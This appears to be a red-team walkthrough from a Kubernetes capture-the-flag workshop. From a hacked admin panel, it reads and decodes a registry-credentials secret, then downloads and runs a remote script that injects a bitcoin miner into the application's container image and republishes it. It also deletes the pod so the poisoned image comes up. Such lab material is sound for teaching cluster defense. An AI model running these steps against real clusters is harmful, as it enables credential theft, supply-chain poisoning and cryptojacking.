# The calls are coming from inside the container! Scenario 3 Attack

## Red Team Update

It appears the blue team has again deleted our bitcoinero pods.  It's time to get sneakier.  Instead of trying to deploy new pods into their cluster, let's poke around to see if there's anything we can use.

Lets see if there are any credentials accessible.

In the hacked admin panel, run the following:
```console
cd /usr/local/bin; curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod 555 kubectl
```
```console
kubectl get secrets
```

Ooh.  There's something called `acr-secret`.  Let's dig in.
```
kubectl get secrets/acr-secret -o json
```

There's a .dockerconfigjson file in the secret that appears to be Base64 encoded

```
kubectl get secrets/acr-secret -o json | jq -r '.data.".dockerconfigjson"' | base64 -d - | jq
```

Now we're talking!  It looks like they put the admin credentials for their registry in a secret.  I bet we can use this to both PUSH and PULL new images to their registry.

We can use [Buildah](https://buildah.io/) to create, pull and push container images.  However, we will need escalated privledges.  

Some of the other red-team members have found this [neat trick from Twitter](https://x.com/mauilion/status/1129468485480751104), which deploy a container that gives us full host access.  Let's work with them to find a way to utilize this.

... TIME PASSES ...

Good luck!  They've come up with two scripts:

* [run-bitcoin-injector.sh](https://github.com/azure/aks-ctf/blob/main/workshop/scenario_3/run-bitcoin-injector.sh) - deploys a [Kubernetes Job](https://kubernetes.io/docs/concepts/workloads/controllers/job/) that uses the registry credentials we found, to create another pod that injects our bitcoinero miner into the container
* [inject-image.sh](https://github.com/azure/aks-ctf/blob/main/workshop/scenario_3/inject-image.sh) - Uses Buildah to pull the current app image, inject the bitcoinero miner into the image and re-publish the image under the same name

Let's go back to our admin panel and run the following:

```console
curl -O -J https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_3/run-bitcoin-injector.sh; bash run-bitcoin-injector.sh
```
!!!tip Tip
    This command may take 1-2 minutes to run. Do not referesh the browser page. Wait for the command to complete.

Everything has been installed.  Let's kill our process and let the new image come up
```console
kubectl delete pod $HOSTNAME
```

The page immediately died (which is understandable since we killed the pod).  Let's reload the page and see if we were successful.  Run the following command in the admin page

```
ps
```

Our `moneymoneymoney` process is there and running inside their container!  Good luck finding that one!